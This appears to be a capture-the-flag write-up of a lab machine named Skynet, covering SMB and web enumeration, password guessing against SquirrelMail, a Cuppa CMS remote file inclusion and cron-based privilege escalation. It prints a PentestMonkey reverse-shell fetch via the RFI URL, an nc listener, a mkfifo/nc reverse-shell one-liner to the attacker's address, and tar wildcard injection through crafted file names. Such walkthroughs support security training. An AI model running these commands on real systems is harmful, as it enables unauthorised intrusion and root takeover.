## Enumeration
Let's start with the `nmap` scan:

As there is port `80` open, let's also run the `gobuster`:

```
gobuster dir -u http://<target_ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt

We discovered `/squirrelmail` directory, but it required authorization.

Let's enumerate more! We still have services that we didn't check yet.
What about `smb`?

```
smbmap -H  <target_ip>
[+] Guest session       IP: <target_ip>:445    Name: <target_ip>

```

It seems that only `anonymous` is readable without authorization. It's a good idea to check what is inside:
```
smbclient \\\\<target_ip>\\anonymous

smb: \> ls

The content of `attention.txt` is:
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Only `log1.txt` in the `\logs` is worth looking, as it contains a list of possible passwords:

```

```

A short sum-up of the enumeration phase:
- we have `milesdyson` as a potential username
- we have the list of potential passwords
- we have two places to try them out: `ssh` and `squirrel mail`

It less likely that `ssh` will be our way in, so let's give `squirrel mail` a try.   
Try to find the correct password for user `milesdyson` on `http://<target_ip>/squirrelmail/src/login.php`.  
I used `Burp Suite` for that, `Hydra` would also do the trick, but you can do it manually, it will not take long. *wink*  

Alright, we are in! Let's check the emails.   
One of them is very interesting, others are useless.   
The email with the subject `Samba Password reset` will cough your eye immediately:
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

This email was sent from `skynet@skynet` to the `milesdyson`, so now we have the password from `smb` share!  
Login to the `smb` with this password and look around.

You will find the file that pointing out that something interesting can be found at the `/45kra24zxs28v3yd`.  
We didn't found that directory in the `smb`, let's check maybe it's on port `80`?  

Navigate to the `http://<target_ip>/45kra24zxs28v3yd/` and check what's there.  
Not so useful, huh?  
Fire up your `gobuster` one more time:
```
gobuster dir -u http://<target_ip>/45kra24zxs28v3yd/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

Yet another vector! The `/administrator` directory leads us to the login form of the `Cuppa CMS`.
Unfortunately, credentials that we already have will not work here.  
Let's look for other ways in.

We don't know the version of the `Cuppa CMS`, but it will not harm anyone if we will check for the available exploits.

## Exploitation

```
searchsploit cuppa

Cuppa CMS - '/alertConfigField.php' Local/Remote File | php/webapps/25971.txt
```

We have only one `RFI`. As we don't have any other ideas let's try it out:

Grab a copy of `php-reverse-shell.php` from `PentestMonkey`, specify there your IP and port.  
Open `nc` listener:
```
sudo nc -nlvp 1337
```
Open the web server in the folder with your reverse shell:
```
 sudo python -m SimpleHTTPServer 80                                                                        
```

Finally, let's trigger the exploit itself:

```
http://<target_ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<your_ip>/php-reverse-shell.php
```

Catch your shell!

You can upgrade your shell by
```
/usr/bin/script -qc /bin/bash /dev/null
```

## PrivEsc

Transport your favorite tool for privilege escalations to the machine. As we already have `SimpleHTTPServer` on port `80` you can use it.  
`cd` to the folder where you have access to writing (`/tmp` for instance) and download the tool.    
I will use [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) this time:

```
www-data@skynet:/tmp$ wget http://<your_ip>/lse.sh
www-data@skynet:/tmp$ chmod +x lse.sh
www-data@skynet:/tmp$ ./lse.sh
```

`lse` has a great `-l` flag, which allows you to specify how many details will be shown. I can recommend starting without it, and if you will not find anything useful, run `lse.sh` again with `-l 1`, `-l 2` or `-l 3` accordingly.

You will eventually spot the `CRON` job is running on `/home/milesdyson/backups/backup.sh`. Let's investigate:

```
www-data@skynet:/tmp$ ls -la /home/milesdyson/backups/backup.sh
-rwxr-xr-x 1 root root 74 Sep 17  2019 /home/milesdyson/backups/backup.sh

www-data@skynet:/tmp$ cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

So, we can't edit the file, but what we can do, is the exploitation of the wildcard in the script.  
You can read more about this vulnerability [here](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/).  

Navigate to the `/var/www/html` and do the following:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_port> >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
Wait for a `CRON` job to execute your `shell.sh`.  
Catch the root shell!

## Takeaway
- Enumeration can easily take half of the time of work on the machine.
- "Connecting the dots" is a useful skill for penetration testing.
- Take your time with the exploitation of the `CRON` jobs, it can take a while to be executed.
